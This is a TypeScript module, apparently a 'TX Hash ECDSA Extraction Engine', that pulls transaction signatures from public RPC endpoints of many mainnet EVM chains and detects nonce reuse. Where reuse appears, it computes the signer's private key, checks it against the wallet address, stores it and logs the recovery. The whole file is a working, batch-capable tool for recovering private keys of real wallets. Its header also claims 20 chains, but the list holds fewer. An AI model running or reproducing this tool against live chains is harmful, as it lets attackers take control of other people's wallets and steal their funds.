// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
/**
 * TX Hash ECDSA Extraction Engine  (Engine 0)  — Multi-Chain Edition
 * ════════════════════════════════════════════════════════════════════
 *
 * Fetches transactions by hash across 20 EVM-compatible blockchains,
 * extracts ECDSA (r, s, z), and detects nonce-reuse / r-collision which
 * allows direct private-key recovery.
 *
 * Chain resolution strategy (all hashes are 0x-prefixed 32-byte EVM format):
 *   Group 1 — Ethereum mainnet              (tried first, alone)
 *   Group 2 — BNB Chain + Polygon           (tried in parallel if G1 misses)
 *   Group 3 — Arbitrum + Optimism + Base    (tried in parallel if G2 misses)
 *   Group 4 — Avalanche + Fantom + Cronos + Linea + Gnosis + zkSync
 *   Group 5 — Tron + Celo + Moonbeam + Moonriver + Harmony + Aurora
 *
 * Within each group all RPCs are queried simultaneously; the first one that
 * returns a valid transaction wins.  A 6-second per-provider abort controller
 * prevents a slow RPC from blocking the whole batch.
 *
 * Attack vector (nonce reuse):
 *   If two txs from the same address share the same r-value then:
 *     k    = (z1 − z2) / (s1 − s2) mod n
 *     priv = (s1·k − z1) · r⁻¹    mod n
 */

import { ethers } from "ethers";
import { logger  } from "../logger";
import fs   from "fs";
import path from "path";

// ── secp256k1 curve order ────────────────────────────────────────────────────
const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

function modInv(a: bigint, m: bigint): bigint {
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function mod(a: bigint, m: bigint): bigint {
  return ((a % m) + m) % m;
}

// ── Multi-chain RPC configuration ─────────────────────────────────────────────

interface ChainDef {
  name:    string;
  rpc:     string;
  chainId: bigint;
}

// Flat ordered list — tried sequentially in groups (defined below).
// Providers are pre-instantiated once at module load with staticNetwork=true
// so ethers v6 never needs to do the eth_chainId discovery handshake.
const ALL_CHAINS: ChainDef[] = [
  // Group 1 — Ethereum
  { name: "ethereum",  rpc: "https://ethereum.publicnode.com",                chainId: 1n         },
  // Group 2 — Major EVM L1s
  { name: "bnb",       rpc: "https://bsc-dataseed1.binance.org",              chainId: 56n        },
  { name: "polygon",   rpc: "https://polygon-rpc.com",                        chainId: 137n       },
  // Group 3 — Major L2s
  { name: "arbitrum",  rpc: "https://arb1.arbitrum.io/rpc",                   chainId: 42161n     },
  { name: "optimism",  rpc: "https://mainnet.optimism.io",                    chainId: 10n        },
  { name: "base",      rpc: "https://mainnet.base.org",                       chainId: 8453n      },
  // Group 4 — Alt-L1s
  { name: "avalanche", rpc: "https://api.avax.network/ext/bc/C/rpc",          chainId: 43114n     },
  { name: "fantom",    rpc: "https://rpcapi.fantom.network",                  chainId: 250n       },
  { name: "cronos",    rpc: "https://evm.cronos.org",                         chainId: 25n        },
  { name: "linea",     rpc: "https://rpc.linea.build",                        chainId: 59144n     },
  { name: "gnosis",    rpc: "https://rpc.gnosischain.com",                    chainId: 100n       },
  { name: "zksync",    rpc: "https://mainnet.era.zksync.io",                  chainId: 324n       },
  // Group 5 — Niche EVM chains
  { name: "celo",      rpc: "https://forno.celo.org",                         chainId: 42220n     },
  { name: "moonbeam",  rpc: "https://rpc.api.moonbeam.network",               chainId: 1284n      },
  { name: "aurora",    rpc: "https://mainnet.aurora.dev",                     chainId: 1313161554n},
  { name: "metis",     rpc: "https://andromeda.metis.io/?owner=1088",         chainId: 1088n      },
  { name: "tron-evm",  rpc: "https://api.trongrid.io/jsonrpc",                chainId: 728126428n },
];

// Group boundary indices — chains within the same group are queried in parallel.
// e.g. [1, 3, 6, 12, 17] means: group0=[0..0], group1=[1..2], group2=[3..5], ...
const GROUP_ENDS = [1, 3, 6, 12, ALL_CHAINS.length];

// Per-group parallel fetch timeout (ms) — generous enough for slow RPCs.
const RPC_TIMEOUT_MS = 7_000;

// ── Pre-cached providers (created once at module load) ────────────────────────
// Using staticNetwork prevents ethers v6 from calling eth_chainId on every
// provider creation, which was causing silent failures.

function makeProvider(chain: ChainDef): ethers.JsonRpcProvider {
  return new ethers.JsonRpcProvider(
    chain.rpc,
    { chainId: Number(chain.chainId), name: chain.name },
    { staticNetwork: true, polling: false },
  );
}

const _providers = new Map<string, ethers.JsonRpcProvider>(
  ALL_CHAINS.map((c) => [c.name, makeProvider(c)])
);

// ── Types ────────────────────────────────────────────────────────────────────

export interface TxSigRecord {
  txHash:      string;
  address:     string;   // recovered signer (lowercased)
  r:           string;   // 0x-prefixed 32-byte hex
  s:           string;
  z:           string;   // unsignedHash = signing preimage hash
  nonce:       number;
  blockNumber: number;
  chain:       string;   // which chain this tx was found on
}

export interface TxHashFinding {
  attackType:        string;
  address:           string;
  txHash1:           string;
  txHash2?:          string;
  sharedR?:          string;
  recoveredPrivKey?: string;
  chain1?:           string;
  chain2?:           string;
  detail:            string;
  confidence:        number;
  discoveredAt:      string;
}

export interface TxHashBatchResult {
  processed:    number;
  fetched:      number;
  failed:       number;
  failedHashes: string[];              // hashes that returned null from ALL chains
  findings:     TxHashFinding[];
  newRecords:   TxSigRecord[];
  chainHits:    Record<string, number>; // chain name → hit count for this batch
}

// ── In-memory cross-tx signature registry ────────────────────────────────────

const _addrSigs = new Map<string, TxSigRecord[]>();   // address → [TxSigRecord]
const _rIndex   = new Map<string, TxSigRecord[]>();   // r-value → [TxSigRecord]

export function resetTxRegistry(): void {
  _addrSigs.clear();
  _rIndex.clear();
}

export function txRegistrySize(): { addresses: number; rValues: number; totalSigs: number } {
  let totalSigs = 0;
  for (const recs of _addrSigs.values()) totalSigs += recs.length;
  return { addresses: _addrSigs.size, rValues: _rIndex.size, totalSigs };
}

// ── Timeout helper ────────────────────────────────────────────────────────────

function withTimeout<T>(promise: Promise<T>, ms: number): Promise<T | null> {
  return Promise.race([
    promise,
    new Promise<null>((resolve) => setTimeout(() => resolve(null), ms)),
  ]);
}

// ── Core: fetch from ONE chain using cached provider ─────────────────────────

async function fetchFromChain(
  chain:  ChainDef,
  txHash: string,
): Promise<TxSigRecord | null> {
  try {
    const provider = _providers.get(chain.name)!;
    const raw = await withTimeout(
      provider.send("eth_getTransactionByHash", [txHash]) as Promise<Record<string, string> | null>,
      RPC_TIMEOUT_MS,
    );

    if (!raw || !raw.r || !raw.s || raw.r === "0x" || raw.s === "0x") return null;

    const type      = raw.type ? parseInt(raw.type, 16) : 0;
    const txChainId = raw.chainId ? BigInt(raw.chainId) : chain.chainId;

    let tx: ethers.Transaction;
    try {
      const txObj: ethers.TransactionLike = {
        type,
        to:        raw.to ?? null,
        nonce:     parseInt(raw.nonce, 16),
        gasLimit:  BigInt(raw.gas),
        value:     BigInt(raw.value),
        data:      raw.input ?? "0x",
        chainId:   txChainId,
        signature: ethers.Signature.from({ r: raw.r, s: raw.s, v: parseInt(raw.v, 16) }),
      };

      if (type === 2) {
        txObj.maxFeePerGas         = BigInt(raw.maxFeePerGas ?? "0");
        txObj.maxPriorityFeePerGas = BigInt(raw.maxPriorityFeePerGas ?? "0");
        txObj.accessList           = raw.accessList as never ?? [];
      } else if (type === 1) {
        txObj.gasPrice   = BigInt(raw.gasPrice ?? "0");
        txObj.accessList = raw.accessList as never ?? [];
      } else {
        txObj.gasPrice = BigInt(raw.gasPrice ?? "0");
      }

      tx = ethers.Transaction.from(txObj);
    } catch {
      return null;
    }

    const address = (tx.from ?? "").toLowerCase();
    if (!address || address === "0x0000000000000000000000000000000000000000") return null;

    return {
      txHash:      txHash.toLowerCase(),
      address,
      r:           raw.r.toLowerCase(),
      s:           raw.s.toLowerCase(),
      z:           tx.unsignedHash,
      nonce:       parseInt(raw.nonce, 16),
      blockNumber: raw.blockNumber ? parseInt(raw.blockNumber, 16) : 0,
      chain:       chain.name,
    };
  } catch {
    return null;
  }
}

// ── Core: multi-chain resolver ────────────────────────────────────────────────
// Tries each group in order; all chains within a group run in parallel.
// Stops as soon as any chain in a group returns a valid result.

export async function fetchTxSigMultiChain(txHash: string): Promise<TxSigRecord | null> {
  let groupStart = 0;
  for (const groupEnd of GROUP_ENDS) {
    const groupChains = ALL_CHAINS.slice(groupStart, groupEnd);
    groupStart = groupEnd;

    // Fire all chains in this group simultaneously, pick first hit
    const results = await Promise.allSettled(
      groupChains.map((chain) => fetchFromChain(chain, txHash))
    );

    for (const result of results) {
      if (result.status === "fulfilled" && result.value !== null) {
        return result.value;
      }
    }
  }
  return null;
}

// ── Core: nonce-reuse detection & key recovery ────────────────────────────────

function checkForNonceReuse(record: TxSigRecord): TxHashFinding[] {
  const findings: TxHashFinding[] = [];
  const now = new Date().toISOString();

  // 1. Same-address r-collision (classic nonce reuse)
  const addrRecs = _addrSigs.get(record.address) ?? [];
  for (const prev of addrRecs) {
    if (prev.r !== record.r) continue;
    if (prev.txHash === record.txHash) continue;
    if (prev.z === record.z) continue;

    const detail =
      `Address ${record.address} reused nonce k across ${prev.chain} tx ` +
      `${prev.txHash.slice(0, 14)}… and ${record.chain} tx ${record.txHash.slice(0, 14)}… ` +
      `(r=${record.r.slice(0, 18)}…)`;

    let recoveredKey: string | undefined;
    try {
      const r   = BigInt(record.r);
      const s1v = BigInt(prev.s);
      const s2v = BigInt(record.s);
      const z1v = BigInt(prev.z);
      const z2v = BigInt(record.z);

      const sDiff = mod(s1v - s2v, N);
      const zDiff = mod(z1v - z2v, N);
      if (sDiff !== 0n) {
        const k = mod(zDiff * modInv(sDiff, N), N);
        if (k > 0n && k < N) {
          const priv = mod((s1v * k - z1v) * modInv(r, N), N);
          if (priv > 0n && priv < N) {
            recoveredKey = "0x" + priv.toString(16).padStart(64, "0");
            try {
              const wallet  = new ethers.Wallet(recoveredKey);
              const derived = wallet.address.toLowerCase();
              if (derived !== record.address) recoveredKey = undefined;
            } catch {
              recoveredKey = undefined;
            }
          }
        }
      }
    } catch {}

    findings.push({
      attackType:        recoveredKey ? "nonce_reuse_key_recovered" : "nonce_reuse_detected",
      address:           record.address,
      txHash1:           prev.txHash,
      txHash2:           record.txHash,
      sharedR:           record.r,
      recoveredPrivKey:  recoveredKey,
      chain1:            prev.chain,
      chain2:            record.chain,
      detail,
      confidence:        recoveredKey ? 1.0 : 0.95,
      discoveredAt:      now,
    });

    if (recoveredKey) {
      logger.info(
        { address: record.address, chain1: prev.chain, chain2: record.chain, key: recoveredKey.slice(0, 18) + "…" },
        "TX-Engine: PRIVATE KEY RECOVERED from cross-chain nonce reuse"
      );
    }
  }

  // 2. Cross-address same-r (shared k across different signers)
  const rRecs = _rIndex.get(record.r) ?? [];
  for (const prev of rRecs) {
    if (prev.address === record.address) continue;
    if (prev.txHash === record.txHash) continue;

    findings.push({
      attackType:   "cross_address_r_collision",
      address:      record.address,
      txHash1:      prev.txHash,
      txHash2:      record.txHash,
      sharedR:      record.r,
      chain1:       prev.chain,
      chain2:       record.chain,
      detail:       `Two DIFFERENT addresses (${prev.address} on ${prev.chain}, ${record.address} on ${record.chain}) share the same ECDSA r-value — both may have used the same k. Both private keys may be recoverable.`,
      confidence:   0.98,
      discoveredAt: now,
    });
  }

  return findings;
}

// ── Public: process a batch of tx hashes (multi-chain) ───────────────────────

export async function processTxHashBatch(
  hashes: string[],
  _provider?: unknown,           // kept for API compat — no longer used
): Promise<TxHashBatchResult> {
  const findings:      TxHashFinding[]        = [];
  const newRecords:    TxSigRecord[]          = [];
  const chainHits:     Record<string, number> = {};
  const failedHashes:  string[]               = [];
  let fetched = 0;
  let failed  = 0;

  for (const hash of hashes) {
    const record = await fetchTxSigMultiChain(hash);
    if (!record) { failed++; failedHashes.push(hash); continue; }
    fetched++;

    chainHits[record.chain] = (chainHits[record.chain] ?? 0) + 1;

    const newFindings = checkForNonceReuse(record);
    findings.push(...newFindings);

    const addrList = _addrSigs.get(record.address) ?? [];
    addrList.push(record);
    _addrSigs.set(record.address, addrList);

    const rList = _rIndex.get(record.r) ?? [];
    rList.push(record);
    _rIndex.set(record.r, rList);

    newRecords.push(record);
  }

  return { processed: hashes.length, fetched, failed, failedHashes, findings, newRecords, chainHits };
}

// ── Utility: read tx hashes / wallets from files ──────────────────────────────

export function loadTxHashesFromFile(filePath: string): string[] {
  try {
    const raw = fs.readFileSync(filePath, "utf8");
    const hashes: string[] = [];
    for (const line of raw.split("\n")) {
      const h = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{64}$/.test(h)) hashes.push(h);
    }
    return hashes;
  } catch {
    return [];
  }
}

export function loadWalletsFromFile(filePath: string): string[] {
  try {
    const raw = fs.readFileSync(filePath, "utf8");
    const addrs: string[] = [];
    for (const line of raw.split("\n")) {
      const a = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{40}$/.test(a)) addrs.push(a);
    }
    return addrs;
  } catch {
    return [];
  }
}

// ── Checkpoint persistence ────────────────────────────────────────────────────

export function loadProcessedHashes(checkpointPath: string): Set<string> {
  const out = new Set<string>();
  try {
    const raw = fs.readFileSync(checkpointPath, "utf8");
    for (const line of raw.split("\n")) {
      const h = line.trim().toLowerCase();
      if (/^0x[0-9a-f]{64}$/.test(h)) out.add(h);
    }
  } catch {}
  return out;
}

export function appendProcessedHashes(checkpointPath: string, hashes: string[]): void {
  if (hashes.length === 0) return;
  try {
    const dir = path.dirname(checkpointPath);
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(checkpointPath, hashes.join("\n") + "\n", "utf8");
  } catch (e) {
    logger.warn({ err: String(e) }, "tx-hash-engine: checkpoint write failed");
  }
}

export function saveRegistryToFile(registryPath: string): void {
  try {
    const dir = path.dirname(registryPath);
    fs.mkdirSync(dir, { recursive: true });
    const payload = {
      savedAt:  new Date().toISOString(),
      addrSigs: Array.from(_addrSigs.entries()),
    };
    fs.writeFileSync(registryPath, JSON.stringify(payload), "utf8");
  } catch (e) {
    logger.warn({ err: String(e) }, "tx-hash-engine: registry save failed");
  }
}

export function loadRegistryFromFile(registryPath: string): number {
  try {
    const raw  = fs.readFileSync(registryPath, "utf8");
    const data = JSON.parse(raw) as { addrSigs: [string, TxSigRecord[]][] };
    if (!Array.isArray(data.addrSigs)) return 0;

    _addrSigs.clear();
    _rIndex.clear();

    let count = 0;
    for (const [addr, records] of data.addrSigs) {
      if (!Array.isArray(records)) continue;
      // Back-fill chain field for old records that pre-date multi-chain support
      const fixed = records.map((r) => ({ ...r, chain: (r as TxSigRecord).chain ?? "ethereum" }));
      _addrSigs.set(addr, fixed);
      for (const rec of fixed) {
        const rList = _rIndex.get(rec.r) ?? [];
        rList.push(rec);
        _rIndex.set(rec.r, rList);
        count++;
      }
    }
    return count;
  } catch {
    return 0;
  }
}
